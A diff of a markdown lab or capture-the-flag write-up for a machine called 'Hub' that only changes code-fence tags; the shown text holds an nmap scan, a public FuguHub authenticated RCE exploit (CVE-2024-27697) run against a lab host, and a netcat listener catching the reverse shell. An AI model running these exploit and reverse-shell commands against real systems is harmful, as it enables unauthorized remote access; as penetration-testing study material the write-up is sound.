@@ -3,7 +3,7 @@
 # 🐧Hub🐧
 ## Enumeration
 Nmap
-```
+```console
 $ nmap -p- -T4 -sV 192.168.143.25
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-08 13:53 AEDT
 Nmap scan report for 192.168.143.25
@@ -20,7 +20,7 @@ port 8082 is running FuguHub
 search FuguHub on github and found the exploit script  
 
 https://github.com/SanjinDedic/FuguHub-8.4-Authenticated-RCE-CVE-2024-27697?tab=readme-ov-file#python-exploit
-```
+```console
 $ python3 exploit.py -r 192.168.143.25 -rp 8082 -l 192.168.45.201 -p 80
 
 [*] Checking for admin user...
@@ -31,7 +31,7 @@ $ python3 exploit.py -r 192.168.143.25 -rp 8082 -l 192.168.45.201 -p 80
 [+] Triggering the reverse shell, check your listener...
 ```
 
-```
+```console
 $ nc -lvnp 80
 listening on [any] 80 ...
 connect to [192.168.45.201] from (UNKNOWN) [192.168.143.25] 49246
